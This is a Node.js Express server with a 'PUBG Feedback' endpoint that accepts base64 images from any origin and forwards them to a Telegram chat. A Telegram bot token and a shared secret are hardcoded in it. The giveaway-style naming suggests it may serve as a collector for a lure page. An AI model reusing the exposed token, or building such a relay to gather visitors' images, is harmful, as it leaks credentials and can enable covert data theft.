const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = "8922215770:AAGpcVkM_lNH4UMdTaChGzA9-62aFZA-pmM";
const TELEGRAM_CHAT_ID   = "@nixnaymar1";
const SECRET             = "pubg_secret_2025_x9k2";

app.use(express.urlencoded({ extended: true, limit: "50mb" }));
app.use(express.json({ limit: "50mb" }));

app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    if (req.method === "OPTIONS") return res.sendStatus(200);
    next();
});

app.get("/", (req, res) => {
    res.send("PUBG Feedback Server — Active");
});

app.post("/feedback", async (req, res) => {
    try {
        const { base64_image, caption, secret } = req.body;

        if (secret !== SECRET) {
            return res.status(403).json({ status: false, error: "bad secret" });
        }
        if (!base64_image) {
            return res.status(400).json({ status: false, error: "empty image" });
        }

        const clean = base64_image.replace(/^data:image\/\w+;base64,/, "");
        const imageBuffer = Buffer.from(clean, "base64");

        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CHAT_ID);
        formData.append("caption", caption || "");
        formData.append("parse_mode", "HTML");
        formData.append("photo", new Blob([imageBuffer], { type: "image/jpeg" }), "winner.jpg");

        const tg = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            { method: "POST", body: formData }
        );
        const result = await tg.json();

        res.json({ status: result.ok, message: result.description || "sent" });
    } catch (err) {
        res.status(500).json({ status: false, error: err.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server on port ${PORT}`);
});
